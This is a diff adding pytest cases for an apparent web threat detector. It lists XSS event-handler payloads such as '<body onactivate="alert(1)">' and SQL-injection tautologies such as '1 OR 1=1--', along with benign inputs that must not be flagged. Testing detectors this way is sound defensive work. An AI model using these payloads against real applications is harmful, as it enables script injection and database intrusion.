+    pytest.param('<body onactivate="alert(1)">', id="onactivate"),
+    pytest.param('<input onfocusin="alert(1)">', id="onfocusin"),
+    pytest.param('<div onmousewheel="alert(1)">', id="onmousewheel"),
+    pytest.param('<marquee onbounce="alert(1)">', id="onbounce"),
+    pytest.param(
+        '<div onwebkitfullscreenchange="alert(1)">', id="onwebkitfullscreenchange"
+    ),
+    pytest.param('<x onafterscriptexecute="alert(1)">', id="onafterscriptexecute"),
+    pytest.param('<x onbeforescriptexecute="alert(1)">', id="onbeforescriptexecute"),
+]
+
+
+@pytest.mark.parametrize("payload", _EVENT_HANDLER_ALLOWLIST_COVERAGE_CLIFF_PAYLOADS)
+def test_xss_event_handler_detected_when_absent_from_prior_allowlist(
+    payload: str,
+) -> None:
+    result = _PRODUCTION_MANAGER.detect(
+        content=payload, ip_address="203.0.113.9", context="request_body"
+    )
+    assert result["is_threat"] is True
+    hit_categories = {threat.get("category") for threat in result["threats"]}
+    assert "xss" in hit_categories
+
+
+_EVENT_HANDLER_ALLOWLIST_STAYS_BOUNDED_PAYLOADS = [
+    pytest.param(
+        '<staff-badge oncall = "true">On call</staff-badge>',
+        id="custom_attribute_oncall_spaced_equals",
+    ),
+    pytest.param(
+        '<div onboarding="true">Welcome</div>',
+        id="custom_attribute_onboarding_unspaced",
+    ),
+    pytest.param(
+        '<div oncustomthing="alert(1)">',
+        id="invented_word_not_a_real_handler",
+    ),
+    pytest.param(
+        '<div onpointerlockchange="alert(1)">',
+        id="real_idl_property_not_html_reflected",
+    ),
+]
+
+
+@pytest.mark.parametrize("payload", _EVENT_HANDLER_ALLOWLIST_STAYS_BOUNDED_PAYLOADS)
+def test_xss_event_handler_allowlist_does_not_admit_non_handler_names(
+    payload: str,
+) -> None:
+    result = _PRODUCTION_MANAGER.detect(
+        content=payload, ip_address="198.51.100.4", context="request_body"
+    )
+    assert result["is_threat"] is False
+
+
+_SQLI_TAUTOLOGY_DETECTED_PAYLOADS = [
+    pytest.param("1 OR 1=1--", id="numeric_tautology_comment"),
+    pytest.param("1 OR 1=1", id="numeric_tautology_bare"),
+    pytest.param("1 or 1=1", id="numeric_tautology_lower"),
+    pytest.param("5 OR 5=5", id="numeric_tautology_five"),
+    pytest.param("1 AND 1=1", id="numeric_tautology_and"),
+    pytest.param("id=1 OR 1=1--", id="numeric_tautology_param"),
+    pytest.param("WHERE id = %s;OR1=1--", id="placeholder_pct_s_tautology"),
+    pytest.param("WHERE id = ?;OR1=1--", id="placeholder_qmark_tautology"),
+    pytest.param("WHERE id = $1;OR1=1--", id="placeholder_dollar_tautology"),
+]
+
+
+@pytest.mark.parametrize("payload", _SQLI_TAUTOLOGY_DETECTED_PAYLOADS)
+def test_sqli_tautology_detected_regardless_of_placeholder_or_literal(
+    payload: str,
+) -> None:
+    result = _PRODUCTION_MANAGER.detect(
+        content=payload, ip_address="198.51.100.4", context="request_body"
+    )
+    assert result["is_threat"] is True
+    hit_categories = {threat.get("category") for threat in result["threats"]}
+    assert "sqli" in hit_categories
+
+
+_SQLI_WHERE_CLAUSE_NOT_FLAGGED_PAYLOADS = [
+    pytest.param("SELECT id FROM users WHERE id = 5", id="int_compare"),
+    pytest.param(
+        "SELECT name, email FROM customers WHERE active = 1", id="bool_compare"
+    ),
+    pytest.param(
+        '{"query":"SELECT count(*) FROM events WHERE day = 3"}', id="json_wrapped"
+    ),
+    pytest.param(
+        "SELECT id FROM sessions WHERE status = 1 OR verified = 2",
+        id="two_distinct_columns",
+    ),
+    pytest.param(
+        "SELECT id FROM sessions WHERE active OR admin", id="two_bare_columns"
+    ),
+]
+
+
+@pytest.mark.parametrize("payload", _SQLI_WHERE_CLAUSE_NOT_FLAGGED_PAYLOADS)
+def test_sqli_where_clause_literal_value_not_flagged(payload: str) -> None:
+    result = _PRODUCTION_MANAGER.detect(
+        content=payload, ip_address="198.51.100.4", context="request_body"
+    )
+    assert result["is_threat"] is False
